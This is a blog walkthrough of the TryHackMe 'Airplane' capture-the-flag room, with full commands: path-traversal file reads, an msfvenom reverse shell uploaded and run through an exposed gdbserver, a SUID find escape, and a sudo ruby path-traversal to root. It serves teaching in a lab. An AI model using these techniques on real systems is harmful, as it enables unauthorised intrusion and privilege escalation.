---
title: "TryHackMe: Airplane"
author: cilgin
date: 2025-07-05 15:57:24 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: false
math: false
mermaid: false
image:
  path: /assets/img/2025-07-05-TryHackMe-Airplane/main.svg
---

Hey everyone, and welcome to another CTF walkthrough! Today, we're buckling up and taking flight with the **[Airplane](https://tryhackme.com/room/airplane)** room on TryHackMe. Let's see if we can get this bird off the ground and land ourselves a root shell.

---

### Step 1: Reconnaissance - The Pre-Flight Checklist

First things first, let's get our target's IP address locked in. A quick `export` will save us from typing it a million times.

```bash
export IP=10.10.77.146
```

With our target in our sights, it's time to unleash the beast: `nmap`. Let's see what doors and windows are open on this airplane.

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-05 16:01 +0300
Nmap scan report for 10.10.77.146
Host is up (0.070s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
6048/tcp open  x11?
8000/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.83 seconds
```

That `airplane.thm` domain needs to be resolved. Let's add it to our `/etc/hosts` file so our browser knows where to go.

```bash
# Add this line to your /etc/hosts file
10.10.77.146 airplane.thm
```

Now, let's visit `http://airplane.thm:8000` in our browser.

![Desktop View](/assets/img/2025-07-05-TryHackMe-Airplane/photo1.webp){: width="972" height="589" }

A pretty simple page. Time to start poking around. Let's fire up `gobuster` to see if we can find any hidden directories or files.

```bash
# Fuzzing for common files and directories
❯ gobuster dir -w common.txt -u http://airplane.thm:8000/ -x md,js,html,php,py,css,txt,bak -t 30
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://airplane.thm:8000/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              txt,bak,md,js,html,php,py,css
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```

Well, that was a whole lot of nothing. `gobuster` came up empty. It seems the web server is only serving `index.html`. But wait... looking at the URL from our browser again, we see `?page=index.html`. A `page` parameter? My vulnerability senses are tingling! This smells like a Local File Inclusion (LFI) vulnerability.

Let's test this theory. Can we traverse the directory structure and read a classic file like `/etc/passwd`?

```bash
# Trying to read /etc/passwd using LFI
❯ curl 'http://airplane.thm:8000/?page=../../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ...
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

Bingo! We have LFI. We can read files from the system. From the output, we see two interesting users: `carlos` and `hudson`. Let's also grab the `/etc/group` file to see if there are any interesting groups.

```bash
# Reading the /etc/group file to find user groups
❯ curl 'http://airplane.thm:8000/?page=../../../../../etc/group'
root:x:0:
# ... (output truncated for brevity)
sudo:x:27:carlos
# ... (output truncated for brevity)
lxd:x:133:
carlos:x:1000:
hudson:x:1001:
```

Interesting! We see that `carlos` is in the `sudo` group, and there's also an `lxd` group. This often hints at a container escape scenario.

### Step 2: From LFI to Source Code

Since the web server is a Werkzeug/Python server, it must be running a Python application. The best way to figure out what's happening under the hood is to read the source code. We can use our LFI vulnerability to peek at the `/proc` filesystem. `/proc/self/` is a magical directory that points to the process handling our current request.

Let's check the status of the process to see who's running it.

```bash
# Checking the process status to find the user ID
❯ curl 'http://airplane.thm:8000/?page=../../../../../proc/self/status'
Name:	python3
Umask:	0022
State:	S (sleeping)
Tgid:	534
Ngid:	0
Pid:	534
PPid:	1
TracerPid:	0
Uid:	1001	1001	1001	1001
Gid:	1001	1001	1001	1001
# ... (output truncated)
```

The `uid` is `1001`, which corresponds to our user `hudson`. So, the web application is running as `hudson`.

Now, let's find out exactly what command started this process by reading `cmdline`.

```bash
# Reading the command line arguments of the running process
❯ curl -s 'http://airplane.thm:8000/?page=../../../../proc/self/cmdline' | sed 's/\x00/ /g'
/usr/bin/python3 app.py
```

Just as we suspected! A Python script named `app.py`. The process's current working directory (`cwd`) should contain this file. Let's grab it.

```bash
# Retrieving the application's source code
❯ curl -s 'http://airplane.thm:8000/?page=../../../../proc/self/cwd/app.py'
```

```python
from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)


@app.route('/')
def index():
    if 'page' in request.args:
        # Here's the vulnerable line! It directly concatenates user input.
        page = 'static/' + request.args.get('page')

        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False

            if os.path.getsize(page) == 0:
                resp.headers["Content-Length"]=str(len(resp.get_data()))

            return resp

        else:
            return "Page not found"

    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)


@app.route('/airplane')
def airplane():
    return render_template('airplane.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)%
```

The source code confirms our LFI. The line `page = 'static/' + request.args.get('page')` is the culprit. By providing `../../...` in the `page` parameter, we escape the `static/` directory and can roam the filesystem.

### Step 3: Deeper Enumeration - What Is Running?

The code itself doesn't seem to offer another vulnerability. So, what else can we find with our file-reading powers? Let's check active network connections with `/proc/net/tcp`.

```bash
# Listing active TCP connections
❯ curl -s 'http://airplane.thm:8000/?page=../../../../proc/net/tcp'
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 16163 1 0000000000000000 100 0 0 10 0
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 19114 1 0000000000000000 100 0 0 10 0
   2: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 18530 1 0000000000000000 100 0 0 10 0
   3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21651 1 0000000000000000 100 0 0 10 0
   4: 00000000:17A0 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21091 1 0000000000000000 100 0 0 10 0
   5: 924D0A0A:B5A2 54E5FD03:01BB 02 00000001:00000000 01:00000481 00000004     0        0 71191 2 0000000000000000 1600 0 0 1 7
   6: 924D0A0A:1F40 80CE150A:D82E 01 00000000:00000000 00:00000000 00000000  1001        0 71193 1 0000000000000000 27 4 30 10 -1
```

This output is a bit cryptic. The IPs and ports are in little-endian hexadecimal. A quick Python script can help us translate this into something human-readable.

```python
import socket

# A handy script to decode /proc/net/tcp
tcp_states = {
    '01': 'ESTABLISHED', '02': 'SYN_SENT',   '03': 'SYN_RECV',
    '04': 'FIN_WAIT1',   '05': 'FIN_WAIT2',  '06': 'TIME_WAIT',
    '07': 'CLOSE',       '08': 'CLOSE_WAIT', '09': 'LAST_ACK',
    '0A': 'LISTEN',      '0B': 'CLOSING',    '0C': 'NEW_SYN_RECV'
}

def hex_to_ip(hex_ip):
    ip_bytes = bytes.fromhex(hex_ip)
    return socket.inet_ntoa(ip_bytes[::-1])

def hex_to_port(hex_port):
    return int(hex_port, 16)

# Paste the data from curl here
raw_data = """
   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 16163 1 0000000000000000 100 0 0 10 0
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 19114 1 0000000000000000 100 0 0 10 0
   2: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 18530 1 0000000000000000 100 0 0 10 0
   3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21651 1 0000000000000000 100 0 0 10 0
   4: 00000000:17A0 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1001        0 21091 1 0000000000000000 100 0 0 10 0
   5: 924D0A0A:1F40 80CE150A:87E2 01 00000000:00000000 00:00000000 00000000  1001        0 71212 1 0000000000000000 27 4 28 10 -1
"""

lines = raw_data.strip().split('\n')
print("Local Address      -> Remote Address     [State]")
print("-------------------------------------------------")
for line in lines:
    parts = line.split()
    if len(parts) < 4: continue

    local_ip_hex, local_port_hex = parts[1].split(':')
    remote_ip_hex, remote_port_hex = parts[2].split(':')
    state = tcp_states.get(parts[3], "UNKNOWN")

    print(f"{hex_to_ip(local_ip_hex):<15}:{hex_to_port(local_port_hex):<5} -> {hex_to_ip(remote_ip_hex):<15}:{hex_to_port(remote_port_hex):<5} [{state}]")
```

Running this script gives us:

```
127.0.0.1      :53    -> 0.0.0.0        :0     [LISTEN]
0.0.0.0        :22    -> 0.0.0.0        :0     [LISTEN]
127.0.0.1      :631   -> 0.0.0.0        :0     [LISTEN]
0.0.0.0        :8000  -> 0.0.0.0        :0     [LISTEN]
0.0.0.0        :6048  -> 0.0.0.0        :0     [LISTEN]
10.10.77.146   :8000  -> 10.21.206.128  :34786 [ESTABLISHED]
```

This confirms what `nmap` told us: port **6048** is listening. Since we can't run commands like `ps` or `netstat`, we have to get creative. Let's write a simple bash script to loop through process IDs in `/proc` and print their command lines. This is like a poor man's `ps aux`.

```bash
#!/usr/bin/env bash

for i in {1..800}; do
  # Use curl to fetch the cmdline file for each process ID
  out=$(curl -s "http://airplane.thm:8000/?page=../../../../../proc/$i/cmdline" | sed 's/\x00/ /g' | grep -v 'Page not found')
  if [ -n "$out" ]; then
    echo "$i : $out"
  fi
done
```

Let's run the script and see what we find...

```bash
❯ bash get-process.sh
# ... (lots of normal system processes)
532 : /usr/bin/gdbserver 0.0.0.0:6048 airplane
534 : /usr/bin/python3 app.py
# ... (more processes)
```

Jackpot! Process ID 532 is running `gdbserver` and it's listening on port `6048` for anyone to connect. This is our way in! `gdbserver` allows for remote debugging. If we can connect to it, we can control the execution of the `airplane` program and, more importantly, make it run our own code.

### Step 4: Gaining Initial Access via GDBServer

Time to craft a reverse shell. We'll use `msfvenom` to generate a simple ELF binary that will connect back to our machine.

I like to use docker but you can directly download metasploit framework from your package manager as well.

```bash
❯ docker run --rm -it -v $PWD:/data parrotsec/metasploit
```

Inside the `msfconsole`:

```bash
msf6 > msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 PrependFork=true -f elf -o binary.elf
[*] exec: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.21.206.128 LPORT=4444 PrependFork=true -f elf -o binary.elf
...
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: /data/binary.elf
```

Now that we have our `binary.elf`, we can use `gdb` to connect to the remote server, upload our binary, and run it.

First, set up a listener on your local machine to catch the reverse shell:

```bash
❯ nc -lvnp 4444
```

Next, connect to the `gdbserver`:

```bash
❯ gdb
```

Inside the `gdb` prompt, we'll perform the following magic trick:

```gdb
# Connect to the remote gdbserver
(gdb) target extended-remote airplane.thm:6048
Remote debugging using airplane.thm:6048

# Upload our malicious binary to the target's /tmp directory
(gdb) remote put binary.elf /tmp/binary.elf
Successfully sent file "binary.elf".

# Tell gdb to execute our file instead of the original 'airplane' binary
(gdb) set remote exec-file /tmp/binary.elf

# Run the program!
(gdb) r
Starting program: /tmp/binary.elf
[Detaching after fork from child process 46409]
[Inferior 1 (process 46408) exited normally]
(gdb)
```

Check your `netcat` listener. You should have a shell!

Let's quickly upgrade to a fully interactive shell for a better experience.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Press Ctrl+Z to background the shell
stty raw -echo;fg
# Press Enter
reset
```

Now, who are we?

```bash
hudson@airplane:/opt$ whoami
hudson
```

We're in as `hudson`!

### Step 5: Privilege Escalation - Hudson to Carlos

Let's see if there are any easy wins for privilege escalation. A good first step is to look for SUID binaries.

```bash
hudson@airplane:/home$ find / -type f -perm /4000 2>/dev/null
/usr/bin/find
/usr/bin/sudo
/usr/bin/pkexec
# ... (many others)
```

Well, hello there. `/usr/bin/find` has the SUID bit set. This is a classic misconfiguration. A quick trip to [GTFOBins](https://gtfobins.github.io/gtfobins/find/) shows us exactly how to exploit this.

```bash
# Using the find SUID binary to execute a shell with the owner's permissions (carlos)
hudson@airplane:/tmp$ find . -exec /bin/sh -p \; -quit
# The -p flag with sh tells it not to drop privileges
$ whoami
carlos
```

Just like that, we are now user `carlos`! Let's grab the user flag.

```bash
$ ls -la /home/carlos
-rw-rw-r--  1 carlos carlos   33 Apr 17  2024 user.txt
$ cat /home/carlos/user.txt
*******************************
```

User flag captured! Now for the final boss: root.

_Pro-Tip: Instead of this temporary shell, a more stable approach would be to use this newfound power as `carlos` to add your SSH public key to `/home/carlos/.ssh/authorized_keys` and then log in directly._

### Step 6: Final Privilege Escalation - Carlos to Root

As user `carlos`, the first thing we should always check is `sudo -l`.

```bash
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

This is a gift from the heavens! We can run any Ruby script (`*.rb`) located in the `/root/` directory as root, without a password. The vulnerability here is the combination of the wildcard (`*`) and our ability to control the path. We can't write to `/root/`, but we can use path traversal!

Let's create our own malicious Ruby script in a world-writable directory like `/tmp`.

```bash
# Create a ruby script that spawns a shell
carlos@airplane:~$ echo 'exec "/bin/sh"' > /tmp/shell.rb
```

Now, we'll use `sudo` to run the Ruby interpreter on our script by tricking it with path traversal.

```bash
# Use path traversal to make ruby execute our script from /tmp
carlos@airplane:~$ sudo /usr/bin/ruby /root/../tmp/shell.rb
# We have a root shell!
whoami
root
ls /root
root.txt  snap
cat /root/root.txt
********************************
```

And there we have it! We've successfully piloted our way from a simple web page to a full root shell. Thanks for flying with me on this walkthrough!
